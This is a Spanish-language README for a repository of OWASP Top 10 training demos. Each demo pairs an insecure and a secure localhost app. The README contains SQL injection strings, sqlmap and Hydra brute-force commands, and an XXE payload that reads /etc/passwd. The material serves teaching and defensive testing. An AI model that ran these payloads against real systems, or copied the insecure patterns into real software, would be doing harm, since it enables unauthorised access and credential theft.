# README #

Repositorio de demos OWASP.

# Links utiles #

* [Owasp zap](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project)
* [Owasp virtual box](https://www.owasp.org/index.php/OWASP_Web_Testing_Environment_Project)
* [Owasp TOP 10 PDF](https://www.owasp.org/images/5/5e/OWASP-Top-10-2017-es.pdf)
* [SQLMAP](http://sqlmap.org/)
* [Hydra](https://sectools.org/tool/hydra/)

# Correr proyectos spring boot #

Para correr: click derecho en proyecto **run as** -> **maven build** en el campo **goals** ingresar **spring-boot:run** luego dar clic en run.

# Proyectos #
## a1inyeccion ##

**Spring boot**

#### inseguras ####

* Pruebas postman:
```
http://localhost:8081/owasp-a1/inseguro/usuario/jdbc/' or '1' like '1
http://localhost:8081/owasp-a1/inseguro/usuario/jpa/' or '1' like '1
```

* Prubas sqlmap
```
./sqlmap.py -u "http://localhost:8081/inseguro/usuario/jpa/admin*" --batch --random-agent -v --risk=3 --level=4 
./sqlmap.py -u "http://localhost:8081/inseguro/usuario/jdbc/admin*" --batch --random-agent -v --risk=3 --level=4
```

#### seguras ####

* Pruebas postman
```
localhost:8081/owasp-a1/seguro/usuario/jpa/' or '1' like '1
localhost:8081/owasp-a1/seguro/usuario/jdbc/' or '1' like '1
```

* Pruebas sqlmap

```
./sqlmap.py -u "http://localhost:8081/seguro/usuario/jpa/admin*" --batch --random-agent -v --risk=3 --level=4
./sqlmap.py -u "http://localhost:8081/seguro/usuario/jdbc/admin*" --batch --random-agent -v --risk=3 --level=4
```

## a2Autenticacion ##

**Spring boot**
Usuario y password **admin**

#### inseguras ####

```
http://localhost:8082
```

```
hydra -s 8082 \
      -L materiales/username.txt \
      -P materiales/password.txt \
      -o ok-out.txt \
      localhost http-form-post "/login:username=^USER^&password=^PASS^:S=seguro" \
      -t 20 -w 40 -vV -d -I
```

#### seguras ####

```
https://localhost:8083
```

```
hydra -s 8083 \
      -L materiales/username.txt \
      -P materiales/password.txt \
      -o ok-out.txt \
      localhost https-form-post "/login:username=^USER^&password=^PASS^:S=seguro" \
      -t 20 -w 40 -vV -d -I
```

## a4xxe ##

**Java 6 - Jetty server**

#### inseguras ####

Para correr: click derecho en proyecto **run as** -> **maven build** en el campo **goals** ingresar **jetty:run** luego dar clic en run.

**URL Comun put - get - delete**
```
http://localhost:8080/rest/libros
```

**PUT crea nuevo libro**
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE bar [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<libro>
    <autor>&xxe;</autor>
    <titulo>Metasploit Unleashed</titulo>
</libro>
```
**GET traer libros**

**GET traer un libro**
```
http://localhost:8080/rest/libros/{ID}
```

**DELETE elimina libros**
```
http://localhost:8080/rest/libros
```

#### seguras ####

**Spring boot**

**URL Comun post - get**
```
http://localhost:8084/seguro/libro
```

**POST crea nuevo libro**
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE bar [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<libro>
    <autor>&xxe;</autor>
    <titulo>Metasploit Unleashed</titulo>
</libro>
```
**GET traer libros**

## a5perdidacontrolacceso ##

**Spring boot**

```
http://localhost:8085
```

** Clase MainControlador.java **
```java
	@GetMapping("/seguro/editar/{id}")
	@PreAuthorize("hasPermission(#id, 'read')")
	public String irActualizar(@PathVariable("id") final long id, final Model model) {
    ...
    }
```
** Clase logica UsuarioOwnerSecure.java **

## a7crosssitescripting ##

**Spring boot**
Se sugiere correr en firefox.

```
http://localhost:8086
```

## a8insecuredeserialization ##

Ejemplo simplemente para comprender el proceso de serializacion y deserializacion.

La forma de atacar es conociendo las clases que se quieren serializar. De caso contrario no podran vulnerar, para eviatar esto se debe usar clases que implementan Serializable con serialID robustos.

